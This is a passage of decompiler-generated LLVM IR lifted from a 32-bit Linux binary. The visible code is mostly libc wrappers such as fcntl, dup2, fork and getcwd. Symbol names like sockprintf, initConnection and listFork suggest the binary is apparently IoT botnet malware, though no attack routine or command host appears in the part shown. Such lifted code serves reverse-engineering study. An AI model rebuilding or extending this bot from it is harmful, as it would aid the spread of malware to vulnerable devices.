64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36 }
  uselistorder i32 ()* @listFork, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i8 13, { 0, 3, 1, 2 }
  uselistorder i32 (i32, i32)* @sockprintf, { 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 22, 0 }
  uselistorder i32 (i32)* @__GI_inet_ntoa, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @sleep, { 3, 2, 1, 0 }
  uselistorder i32 ()* @initConnection, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 (i32)* @zprintf, { 2, 1, 0 }
  uselistorder i32 (i32)* @__libc_fork, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_8059bb5.453 to i32), { 0, 2, 1 }
  uselistorder [2 x i8]* @global_var_8059ba6.451, { 1, 0 }
  uselistorder i32 ptrtoint ([2 x i8]* @global_var_8059ba6.451 to i32), { 1, 0 }
  uselistorder i32 (i32)* @init_rand, { 1, 0 }
  uselistorder i32 (i32)* @srand, { 2, 1, 0 }
  uselistorder i32 (i32*)* @__GI_time, { 7, 8, 9, 10, 11, 12, 24, 25, 13, 14, 15, 16, 17, 18, 19, 20, 21, 0, 1, 2, 3, 4, 5, 6, 22, 23 }
  uselistorder i32 ptrtoint (i32* @global_var_8059b92.449 to i32), { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051093.outer, { 0, 2, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_8051076, { 1, 0 }
  uselistorder label %dec_label_pc_805102a, { 1, 0 }
  uselistorder label %dec_label_pc_8050f9b, { 1, 0 }
  uselistorder label %dec_label_pc_8050f70, { 1, 0 }
  uselistorder label %dec_label_pc_8050edd, { 1, 0 }
  uselistorder label %dec_label_pc_8050e07, { 1, 0 }
  uselistorder label %dec_label_pc_8050df6, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050dec, { 1, 0 }
  uselistorder label %dec_label_pc_8050d85, { 1, 0 }
  uselistorder label %dec_label_pc_8050d1c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050d12, { 1, 0 }
  uselistorder label %dec_label_pc_8050ce5, { 1, 0 }
  uselistorder label %dec_label_pc_8050beb, { 1, 0 }
  uselistorder label %dec_label_pc_8050b80, { 1, 0 }
  uselistorder label %dec_label_pc_8050b5e, { 1, 0 }
  uselistorder label %dec_label_pc_8050aaa, { 1, 0 }
  uselistorder label %dec_label_pc_8050a80, { 1, 0 }
  uselistorder label %dec_label_pc_80509e6, { 1, 0 }
  uselistorder label %dec_label_pc_80509dd.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80509b6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805093b, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_805083a, { 1, 0 }
  uselistorder label %dec_label_pc_8050799, { 1, 0 }
}

define i32 @__vfork(i32 %arg1) local_unnamed_addr {
entry:
  %v0_80510ce = call i32 @vfork()
  %v5_80510d1 = icmp ult i32 %v0_80510ce, -4095
  %v1_80510d6 = icmp eq i1 %v5_80510d1, false
  call void @__pseudo_cond_branch(i1 %v1_80510d6, i32 134567144)
  ret i32 %v0_80510ce
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_80510e0 = load i32, i32* @edi, align 4
  %v0_80510e1 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg3, i32* @edx, align 4
  %v1_80510f9 = add i32 %arg2, -12
  %v6_80510ff = icmp ugt i32 %v1_80510f9, 2
  br i1 %v6_80510ff, label %dec_label_pc_805110f, label %dec_label_pc_8051101

dec_label_pc_8051101:                             ; preds = %entry
  %v4_8051105 = call i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_80510f9)
  br label %dec_label_pc_8051131

dec_label_pc_805110f:                             ; preds = %entry
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8051117 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_8051117, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_8051117, -4095
  br i1 %tmp, label %dec_label_pc_805112f, label %dec_label_pc_8051123

dec_label_pc_8051123:                             ; preds = %dec_label_pc_805110f
  %v1_8051123 = call i32 @__errno_location(i32 %v0_80510e1)
  %v0_8051128 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051128 = sub i32 0, %v0_8051128
  %v2_805112a = inttoptr i32 %v1_8051123 to i32*
  store i32 %v1_8051128, i32* %v2_805112a, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805112f

dec_label_pc_805112f:                             ; preds = %dec_label_pc_805110f, %dec_label_pc_8051123
  %v0_805112f = phi i32 [ %v2_8051117, %dec_label_pc_805110f ], [ -1, %dec_label_pc_8051123 ]
  br label %dec_label_pc_8051131

dec_label_pc_8051131:                             ; preds = %dec_label_pc_8051101, %dec_label_pc_805112f
  %v0_8051136 = phi i32 [ %v4_8051105, %dec_label_pc_8051101 ], [ %v0_805112f, %dec_label_pc_805112f ]
  store i32 %v0_80510e1, i32* @ebx, align 4
  store i32 %v0_80510e0, i32* @edi, align 4
  ret i32 %v0_8051136

; uselistorder directives
  uselistorder i32 %v2_8051117, { 1, 0, 2 }
  uselistorder i32 %v0_80510e1, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8051131, { 1, 0 }
  uselistorder label %dec_label_pc_805112f, { 1, 0 }
}

define i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051138 = load i32, i32* @edi, align 4
  store i32 %v0_8051138, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg3, i32* @edx, align 4
  %v0_8051150 = load i32, i32* @ebx, align 4
  %v1_8051158 = call i32 @int80_syscall(i32 221)
  store i32 %v1_8051158, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8051158, -4095
  br i1 %tmp, label %dec_label_pc_8051170, label %dec_label_pc_8051164

dec_label_pc_8051164:                             ; preds = %entry
  %v1_8051164 = call i32 @__errno_location(i32 %v0_8051150)
  %v0_8051169 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051169 = sub i32 0, %v0_8051169
  %v2_805116b = inttoptr i32 %v1_8051164 to i32*
  store i32 %v1_8051169, i32* %v2_805116b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051170

dec_label_pc_8051170:                             ; preds = %entry, %dec_label_pc_8051164
  %v0_8051173 = phi i32 [ %v1_8051158, %entry ], [ -1, %dec_label_pc_8051164 ]
  %v2_8051175 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051175, i32* %edi.global-to-local, align 4
  ret i32 %v0_8051173

; uselistorder directives
  uselistorder i32 %v1_8051158, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051170, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_8051179 = load i32, i32* @ebx, align 4
  store i32 %v0_8051179, i32* %stack_var_-8, align 4
  %v5_805117a = icmp ult i32* %stack_var_-8, inttoptr (i32 4 to i32*)
  store i1 %v5_805117a, i1* @cf, align 1
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @chdir(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80511a0 = load i32, i32* @edi, align 4
  store i32 %v0_80511a0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_80511a8 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_80511b0 = call i32 @chdir(i32 %v0_80511a8)
  store i32 %v0_80511a8, i32* @ebx, align 4
  store i32 %v1_80511b0, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_80511b0, -4095
  br i1 %tmp, label %dec_label_pc_80511c8, label %dec_label_pc_80511bc

dec_label_pc_80511bc:                             ; preds = %entry
  %v1_80511bc = call i32 @__errno_location(i32 %v0_80511a8)
  %v0_80511c1 = load i32, i32* %edi.global-to-local, align 4
  %v1_80511c1 = sub i32 0, %v0_80511c1
  %v2_80511c3 = inttoptr i32 %v1_80511bc to i32*
  store i32 %v1_80511c1, i32* %v2_80511c3, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80511c8

dec_label_pc_80511c8:                             ; preds = %entry, %dec_label_pc_80511bc
  %v0_80511c9 = phi i32 [ %v1_80511b0, %entry ], [ -1, %dec_label_pc_80511bc ]
  %v2_80511c8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80511c8, i32* @edx, align 4
  %v2_80511cc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80511cc, i32* @edi, align 4
  ret i32 %v0_80511c9

; uselistorder directives
  uselistorder i32 %v1_80511b0, { 1, 0, 2 }
  uselistorder i32 %v0_80511a8, { 1, 0, 2 }
  uselistorder i32 (i32)* @chdir, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80511c8, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80511d0 = load i32, i32* @edi, align 4
  store i32 %v0_80511d0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_80511d8 = load i32, i32* @ebx, align 4
  %v1_80511e0 = call i32 @close(i32 %arg1)
  store i32 %v0_80511d8, i32* @ebx, align 4
  store i32 %v1_80511e0, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_80511e0, -4095
  br i1 %tmp, label %dec_label_pc_80511f8, label %dec_label_pc_80511ec

dec_label_pc_80511ec:                             ; preds = %entry
  %v1_80511ec = call i32 @__errno_location(i32 %v0_80511d8)
  %v0_80511f1 = load i32, i32* %edi.global-to-local, align 4
  %v1_80511f1 = sub i32 0, %v0_80511f1
  %v2_80511f3 = inttoptr i32 %v1_80511ec to i32*
  store i32 %v1_80511f1, i32* %v2_80511f3, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80511f8

dec_label_pc_80511f8:                             ; preds = %entry, %dec_label_pc_80511ec
  %v0_80511f9 = phi i32 [ %v1_80511e0, %entry ], [ -1, %dec_label_pc_80511ec ]
  %v2_80511f8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80511f8, i32* @edx, align 4
  %v2_80511fc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80511fc, i32* @edi, align 4
  ret i32 %v0_80511f9

; uselistorder directives
  uselistorder i32 %v1_80511e0, { 1, 0, 2 }
  uselistorder i32 %v0_80511d8, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80511f8, { 1, 0 }
}

define i32 @dup2(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8051200 = load i32, i32* @ebx, align 4
  store i32 %v0_8051200, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_8051213 = call i32 @dup2(i32 %v0_8051200, i32 %tmp4)
  store i32 %v2_8051213, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_8051213, -4095
  br i1 %tmp, label %dec_label_pc_805122c, label %dec_label_pc_8051220

dec_label_pc_8051220:                             ; preds = %entry
  %v0_8051220 = load i32, i32* %stack_var_-4, align 4
  %v1_8051220 = call i32 @__errno_location(i32 %v0_8051220)
  %v0_8051225 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051225 = sub i32 0, %v0_8051225
  %v2_8051227 = inttoptr i32 %v1_8051220 to i32*
  store i32 %v1_8051225, i32* %v2_8051227, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805122c

dec_label_pc_805122c:                             ; preds = %entry, %dec_label_pc_8051220
  %v0_805122d = phi i32 [ %v2_8051213, %entry ], [ -1, %dec_label_pc_8051220 ]
  %v2_8051230 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051230, i32* @ebx, align 4
  ret i32 %v0_805122d

; uselistorder directives
  uselistorder i32 %v2_8051213, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @dup2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805122c, { 1, 0 }
}

define i32 @__libc_fork(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051234 = load i32, i32* @ebx, align 4
  store i32 %v0_8051234, i32* %stack_var_-4, align 4
  %v1_805123d = call i32 @fork(i32 %v0_8051234)
  store i32 %v1_805123d, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805123d, -4095
  br i1 %tmp, label %dec_label_pc_8051254, label %dec_label_pc_8051248

dec_label_pc_8051248:                             ; preds = %entry
  %v0_8051248 = load i32, i32* %stack_var_-4, align 4
  %v1_8051248 = call i32 @__errno_location(i32 %v0_8051248)
  %v0_805124d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805124d = sub i32 0, %v0_805124d
  %v2_805124f = inttoptr i32 %v1_8051248 to i32*
  store i32 %v1_805124d, i32* %v2_805124f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051254

dec_label_pc_8051254:                             ; preds = %entry, %dec_label_pc_8051248
  %v0_8051255 = phi i32 [ %v1_805123d, %entry ], [ -1, %dec_label_pc_8051248 ]
  %v2_8051254 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051254, i32* @edx, align 4
  %v2_8051258 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051258, i32* @ebx, align 4
  ret i32 %v0_8051255

; uselistorder directives
  uselistorder i32 %v1_805123d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051254, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp12, i32* %stack_var_-44, align 4
  %tmp13 = call i32 @__decompiler_undefined_function_0()
  %v0_805125c = load i32, i32* @ebp, align 4
  %v0_805125d = load i32, i32* @edi, align 4
  %v0_805125e = load i32, i32* @esi, align 4
  %v0_805125f = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebp, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_805126b = icmp eq i32 %arg2, 0
  %v1_805126d = icmp eq i1 %v1_805126b, false
  %v1_8051297 = icmp eq i32 %arg1, 0
  br i1 %v1_805126d, label %dec_label_pc_8051297, label %dec_label_pc_805126f

dec_label_pc_805126f:                             ; preds = %entry
  br i1 %v1_8051297, label %dec_label_pc_8051283, label %dec_label_pc_8051273

dec_label_pc_8051273:                             ; preds = %dec_label_pc_805126f
  %v1_8051273 = call i32 @__errno_location(i32 %v0_805125f)
  %v1_8051278 = inttoptr i32 %v1_8051273 to i32*
  store i32 22, i32* %v1_8051278, align 4
  br label %dec_label_pc_8051308

dec_label_pc_8051283:                             ; preds = %dec_label_pc_805126f
  %v3_8051283 = call i32 @__GI_getpagesize(i32 %v0_805125f, i32 %v0_805125e, i32 %v0_805125d)
  %v1_805128d = add i32 %v3_8051283, -4096
  %v3_805128d = sub i32 4095, %v3_8051283
  %v4_805128d = and i32 %v3_805128d, %v3_8051283
  %v5_805128d = icmp slt i32 %v4_805128d, 0
  %v7_805128d = icmp slt i32 %v1_805128d, 0
  %v2_8051292 = icmp eq i1 %v7_805128d, %v5_805128d
  %v5_8051292 = select i1 %v2_8051292, i32 %v3_8051283, i32 4096
  store i32 %v5_8051292, i32* @ebx, align 4
  br label %dec_label_pc_805129f

dec_label_pc_8051297:                             ; preds = %entry
  store i32 %arg2, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_805129d = icmp eq i1 %v1_8051297, false
  br i1 %v1_805129d, label %dec_label_pc_80512b1, label %dec_label_pc_805129f

dec_label_pc_805129f:                             ; preds = %dec_label_pc_8051297, %dec_label_pc_8051283
  %v0_80512a2 = phi i32 [ %arg2, %dec_label_pc_8051297 ], [ %v5_8051292, %dec_label_pc_8051283 ]
  store i32 %v0_80512a2, i32* %stack_var_-44, align 4
  %v1_80512a3 = call i32 @malloc(i32 %v0_80512a2)
  %v1_80512ab = icmp eq i32 %v1_80512a3, 0
  store i32 %v1_80512a3, i32* @esi, align 4
  br i1 %v1_80512ab, label %dec_label_pc_8051308, label %dec_label_pc_805129f.dec_label_pc_80512b1_crit_edge

dec_label_pc_805129f.dec_label_pc_80512b1_crit_edge: ; preds = %dec_label_pc_805129f
  %v0_80512bc.pre = load i32, i32* %stack_var_-44, align 4
  br label %dec_label_pc_80512b1

dec_label_pc_80512b1:                             ; preds = %dec_label_pc_805129f.dec_label_pc_80512b1_crit_edge, %dec_label_pc_8051297
  %v0_80512bc = phi i32 [ %v0_80512bc.pre, %dec_label_pc_805129f.dec_label_pc_80512b1_crit_edge ], [ %tmp12, %dec_label_pc_8051297 ]
  %v0_80512b1 = phi i32 [ %v1_80512a3, %dec_label_pc_805129f.dec_label_pc_80512b1_crit_edge ], [ %arg1, %dec_label_pc_8051297 ]
  store i32 %v0_80512b1, i32* @ebx, align 4
  %v2_80512bc = call i32 @getcwd(i32 %v0_80512bc, i32 %tmp13)
  %v0_80512be = load i32, i32* @ebx, align 4
  store i32 %v0_80512be, i32* @edx, align 4
  store i32 %v2_80512bc, i32* @ebx, align 4
  %tmp = icmp ult i32 %v2_80512bc, -4095
  br i1 %tmp, label %dec_label_pc_80512d4, label %dec_label_pc_80512c9

dec_label_pc_80512c9:                             ; preds = %dec_label_pc_80512b1
  %v0_80512c9 = load i32, i32* %stack_var_-44, align 4
  %v1_80512c9 = call i32 @__errno_location(i32 %v0_80512c9)
  %v0_80512ce = load i32, i32* @ebx, align 4
  %v1_80512ce = sub i32 0, %v0_80512ce
  store i32 %v1_80512ce, i32* @ebx, align 4
  %v2_80512d0 = inttoptr i32 %v1_80512c9 to i32*
  store i32 %v1_80512ce, i32* %v2_80512d0, align 4
  br label %dec_label_pc_80512f6

dec_label_pc_80512d4:                             ; preds = %dec_label_pc_80512b1
  %v2_80512d4 = icmp slt i32 %v2_80512bc, 0
  br i1 %v2_80512d4, label %dec_label_pc_80512f6, label %dec_label_pc_80512d8

dec_label_pc_80512d8:                             ; preds = %dec_label_pc_80512d4
  %v0_80512d8 = load i32, i32* @edi, align 4
  %v1_80512d8 = icmp eq i32 %v0_80512d8, 0
  %v1_80512da = icmp eq i1 %v1_80512d8, false
  br i1 %v1_80512da, label %dec_label_pc_805130a, label %dec_label_pc_80512dc

dec_label_pc_80512dc:                             ; preds = %dec_label_pc_80512d8
  br i1 %v1_805126d, label %dec_label_pc_80512f2, label %dec_label_pc_80512e0

dec_label_pc_80512e0:                             ; preds = %dec_label_pc_80512dc
  %v0_80512e3 = load i32, i32* @esi, align 4
  store i32 %v0_80512e3, i32* %stack_var_-44, align 4
  %v4_80512e4 = inttoptr i32 %v0_80512e3 to i32*
  %v5_80512e4 = call i32 @realloc(i32* %v4_80512e4, i32 %v2_80512bc, i32 %v0_80512be, i32 %v0_80512be)
  %v1_80512ec = icmp eq i32 %v5_80512e4, 0
  %v1_80512f0 = icmp eq i1 %v1_80512ec, false
  br i1 %v1_80512f0, label %dec_label_pc_805130a, label %dec_label_pc_80512f2

dec_label_pc_80512f2:                             ; preds = %dec_label_pc_80512e0, %dec_label_pc_80512dc
  %v0_80512f2 = load i32, i32* @esi, align 4
  br label %dec_label_pc_805130a

dec_label_pc_80512f6:                             ; preds = %dec_label_pc_80512d4, %dec_label_pc_80512c9
  %v0_80512f6 = load i32, i32* @edi, align 4
  %v1_80512f6 = icmp eq i32 %v0_80512f6, 0
  %v1_80512f8 = icmp eq i1 %v1_80512f6, false
  br i1 %v1_80512f8, label %dec_label_pc_8051308, label %dec_label_pc_80512fa

dec_label_pc_80512fa:                             ; preds = %dec_label_pc_80512f6
  %v0_80512fd = load i32, i32* @esi, align 4
  store i32 %v0_80512fd, i32* %stack_var_-44, align 4
  %v1_80512fe = call i32 @free(i32 %v0_80512fd)
  %v0_805130d.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805130a

dec_label_pc_8051308:                             ; preds = %dec_label_pc_80512f6, %dec_label_pc_805129f, %dec_label_pc_8051273
  br label %dec_label_pc_805130a

dec_label_pc_805130a:                             ; preds = %dec_label_pc_80512e0, %dec_label_pc_80512d8, %dec_label_pc_80512fa, %dec_label_pc_80512f2, %dec_label_pc_8051308
  %v0_805130d = phi i32 [ %v5_80512e4, %dec_label_pc_80512e0 ], [ %v0_80512d8, %dec_label_pc_80512d8 ], [ %v0_805130d.pre, %dec_label_pc_80512fa ], [ %v0_80512f2, %dec_label_pc_80512f2 ], [ 0, %dec_label_pc_8051308 ]
  %v0_805130a = load i32, i32* @esp, align 4
  %v5_805130a = icmp ugt i32 %v0_805130a, -13
  store i1 %v5_805130a, i1* @cf, align 1
  store i32 %v0_805125f, i32* @ebx, align 4
  store i32 %v0_805125e, i32* @esi, align 4
  store i32 %v0_805125d, i32* @edi, align 4
  store i32 %v0_805125c, i32* @ebp, align 4
  ret i32 %v0_805130d

; uselistorder directives
  uselistorder i32 %v2_80512bc, { 1, 3, 0, 2 }
  uselistorder i32 %v0_80512a2, { 1, 0 }
  uselistorder i32 %v3_8051283, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-44, { 3, 4, 2, 0, 5, 1 }
  uselistorder i1* @cf, { 0, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 -13, { 1, 0 }
  uselistorder i32 (i32, i32)* @getcwd, { 1, 0 }
  uselistorder i32 4095, { 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_805130a, { 4, 2, 3, 0, 1 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_8051317 = ptrtoint i32* %stack_var_-8 to i32
  %v2_805131e = call i32 @getrlimit(i32 7, i32 %v2_8051317)
  store i32 256, i32* @edx, align 4
  %v2_805132b = icmp slt i32 %v2_805131e, 0
  br i1 %v2_805132b, label %dec_label_pc_8051333, label %dec_label_pc_805132f

dec_label_pc_805132f:                             ; preds = %entry
  %v3_805132f = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_805132f, i32* @edx, align 4
  br label %dec_label_pc_8051333

dec_label_pc_8051333:                             ; preds = %entry, %dec_label_pc_805132f
  %v0_8051333 = phi i32 [ 256, %entry ], [ %v3_805132f, %dec_label_pc_805132f ]
  ret i32 %v0_8051333

; uselistorder directives
  uselistorder label %dec_label_pc_8051333, { 1, 0 }
}

define i32 @__GI_getpagesize(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_805133c = load i32, i32* @global_var_8062770.465, align 16
  store i32 %v0_805133c, i32* @edx, align 4
  %v1_8051347 = icmp eq i32 %v0_805133c, 0
  %v1_8051349 = icmp eq i1 %v1_8051347, false
  %v4_8051349 = select i1 %v1_8051349, i32 %v0_805133c, i32 4096
  ret i32 %v4_8051349
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051350 = load i32, i32* @ebx, align 4
  store i32 %v0_8051350, i32* %stack_var_-4, align 4
  %v1_8051359 = call i32 @getpid(i32 %v0_8051350)
  store i32 %v1_8051359, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8051359, -4095
  br i1 %tmp, label %dec_label_pc_8051370, label %dec_label_pc_8051364

dec_label_pc_8051364:                             ; preds = %entry
  %v0_8051364 = load i32, i32* %stack_var_-4, align 4
  %v1_8051364 = call i32 @__errno_location(i32 %v0_8051364)
  %v0_8051369 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051369 = sub i32 0, %v0_8051369
  %v2_805136b = inttoptr i32 %v1_8051364 to i32*
  store i32 %v1_8051369, i32* %v2_805136b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051370

dec_label_pc_8051370:                             ; preds = %entry, %dec_label_pc_8051364
  %v0_8051371 = phi i32 [ %v1_8051359, %entry ], [ -1, %dec_label_pc_8051364 ]
  %v2_8051374 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051374, i32* @ebx, align 4
  ret i32 %v0_8051371

; uselistorder directives
  uselistorder i32 %v1_8051359, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051370, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051378 = load i32, i32* @ebx, align 4
  store i32 %v0_8051378, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_805138b = call i32 @int80_syscall(i32 191)
  store i32 %v1_805138b, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805138b, -4095
  br i1 %tmp, label %dec_label_pc_80513a4, label %dec_label_pc_8051398

dec_label_pc_8051398:                             ; preds = %entry
  %v0_8051398 = load i32, i32* %stack_var_-4, align 4
  %v1_8051398 = call i32 @__errno_location(i32 %v0_8051398)
  %v0_805139d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805139d = sub i32 0, %v0_805139d
  %v2_805139f = inttoptr i32 %v1_8051398 to i32*
  store i32 %v1_805139d, i32* %v2_805139f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80513a4

dec_label_pc_80513a4:                             ; preds = %entry, %dec_label_pc_8051398
  %v0_80513a5 = phi i32 [ %v1_805138b, %entry ], [ -1, %dec_label_pc_8051398 ]
  %v2_80513a8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80513a8, i32* @ebx, align 4
  ret i32 %v0_80513a5

; uselistorder directives
  uselistorder i32 %v1_805138b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80513a4, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_80513ac = load i32, i32* @edi, align 4
  store i32 %v0_80513ac, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_80513c4 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_80513cc = call i32 @ioctl(i32 %v0_80513c4, i32 %tmp9, i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_80513c4, i32* @ebx, align 4
  store i32 %v3_80513cc, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v3_80513cc, -4095
  br i1 %tmp, label %dec_label_pc_80513e4, label %dec_label_pc_80513d8

dec_label_pc_80513d8:                             ; preds = %entry
  %v1_80513d8 = call i32 @__errno_location(i32 %v0_80513c4)
  %v0_80513dd = load i32, i32* %edi.global-to-local, align 4
  %v1_80513dd = sub i32 0, %v0_80513dd
  %v2_80513df = inttoptr i32 %v1_80513d8 to i32*
  store i32 %v1_80513dd, i32* %v2_80513df, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80513e4

dec_label_pc_80513e4:                             ; preds = %entry, %dec_label_pc_80513d8
  %v0_80513e7 = phi i32 [ %v3_80513cc, %entry ], [ -1, %dec_label_pc_80513d8 ]
  %v2_80513e9 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80513e9, i32* @edi, align 4
  ret i32 %v0_80513e7

; uselistorder directives
  uselistorder i32 %v3_80513cc, { 1, 0, 2 }
  uselistorder i32 %v0_80513c4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80513e4, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
